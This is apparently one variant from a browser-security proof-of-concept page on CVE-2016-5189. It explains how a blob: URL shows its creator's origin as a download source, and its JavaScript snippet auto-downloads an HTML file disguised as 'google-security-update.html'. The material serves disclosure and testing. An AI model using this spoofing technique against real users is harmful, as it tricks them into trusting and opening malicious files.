Variant 5 — blob: URL Shows Parent Origin (XSS precondition)

CVE-2016-5189 (Chrome) · Requires XSS on trusted domain to weaponize
DesktopMobile

blob: URL created on this page shows this page's origin in the download source. In real attack: XSS on accounts.google.com → create blob → download shows google.com. No fix needed — this is by-design but exploitable via XSS. 

// This page's origin will appear as download source:
const html = '<h1>Malicious content</h1>';
const blob = new Blob([html], { type: 'text/html' });
const url = URL.createObjectURL(blob);
// url = blob:https://this-origin.com/uuid
// Download bar shows: "From this-origin.com"
const a = document.createElement('a');
a.href = url; a.download = 'google-security-update.html';
a.click();
